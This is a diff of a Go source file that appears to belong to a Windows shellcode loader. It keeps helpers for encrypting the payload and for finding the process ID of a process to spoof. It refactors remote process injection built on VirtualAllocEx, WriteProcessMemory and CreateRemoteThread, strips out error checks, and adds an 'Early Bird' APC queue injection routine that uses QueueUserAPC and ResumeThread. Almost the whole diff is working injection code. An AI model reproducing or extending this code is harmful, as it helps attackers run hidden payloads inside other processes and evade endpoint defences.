@@ -6,13 +6,15 @@ import (
 	"crypto/md5"
 	"crypto/rand"
 	"encoding/hex"
+	"errors"
+	windows "golang.org/x/sys/windows"
 	"io"
 	"os"
 	"strings"
-	"unsafe"
-	"errors"
 	"syscall"
+	"unsafe"
 )
+
 //Encrypt Functions
 
 func createHash(key string) []byte {
@@ -54,6 +56,7 @@ func Decrypt(data []byte, passphrase string) []byte {
 	}
 	return plaintext
 }
+
 // Process Functions
 // Needed to enum process to get pid of process we want to spoof
 const TH32CS_SNAPPROCESS = 0x00000002
@@ -134,40 +137,16 @@ const (
 
 var (
 	kernel32            = syscall.MustLoadDLL("kernel32.dll")
-	ntdll               = syscall.MustLoadDLL("ntdll.dll")
 	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
 	VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
 	WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
-	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
-	CreateThread        = kernel32.MustFindProc("CreateThread")
 	OpenProcess         = kernel32.MustFindProc("OpenProcess")
 	WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
-	procVirtualProtect  = kernel32.MustFindProc("VirtualProtect")
 	CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
+	QueueUserAPC        = kernel32.MustFindProc("QueueUserAPC")
 )
 
-//=========================================================
-//		VirtualProtect
-//=========================================================
-
-// VirtualProtect is used to set the memory region to PAGE_EXECUTE_READWRITE
-func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
-	ret, _, _ := procVirtualProtect.Call(
-		uintptr(lpAddress),
-		uintptr(dwSize),
-		uintptr(flNewProtect),
-		uintptr(lpflOldProtect))
-	return ret > 0
-}
-
-//=========================================================
-//		CreateRemoteThread
-//=========================================================
-
-// ShellCodeCreateRemoteThread spawns shellcode in a remote process
-func ShellCodeCreateRemoteThread(PID int, Shellcode []byte) error {
-	// code adapted from: https://github.com/EgeBalci/EGESPLOIT/blob/1a6c4321e9a5b27dc564069fccf03e8f38f3576d/Migrate.go
-
+func WriteShellcode(PID int, Shellcode []byte) (uintptr, uintptr, int) {
 	L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	L_AddrPtr := (*[6300000]byte)(unsafe.Pointer(L_Addr))
 	for i := 0; i < len(Shellcode); i++ {
@@ -175,21 +154,13 @@ func ShellCodeCreateRemoteThread(PID int, Shellcode []byte) error {
 	}
 	var F int = 0
 	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
-	if Proc == 0 {
-		err := errors.New("unable to open remote process")
-		return err
-	}
 	R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	if R_Addr == 0 {
-		err := errors.New("unable to allocate memory in remote process")
-		return err
-	}
-	WPMS, _, _ := WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))
-	if WPMS == 0 {
-		err := errors.New("unable to write shellcode to remote process")
-		return err
-	}
+	WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))
+	return Proc, R_Addr, F
+}
 
+//ShellCodeCreateRemoteThread spawns shellcode in a remote process using CreateRemoteThread
+func ShellCodeCreateRemoteThread(Proc uintptr, R_Addr uintptr, F int) error {
 	CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
 	if CRTS == 0 {
 		err := errors.New("[!] ERROR : Can't Create Remote Thread.")
@@ -200,6 +171,17 @@ func ShellCodeCreateRemoteThread(PID int, Shellcode []byte) error {
 		return errors.New("Error calling WaitForSingleObject:\r\n") //+ errRtlCreateUserThread.Error())
 	}
 
+	return nil
+}
+
+//EBAPCQueue spawns shellcode in a remote process using Early Bird APC Queue Code Injection
+func EBAPCQueue(R_Addr uintptr, victimHandle windows.Handle) error {
+	_, _, errQueueUserAPC := QueueUserAPC.Call(R_Addr, uintptr(victimHandle), 0)
+	if errQueueUserAPC.Error() != "The operation completed successfully." {
+		err := errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
+		return err
+	}
+	windows.ResumeThread(victimHandle)
 	return nil
 }
 
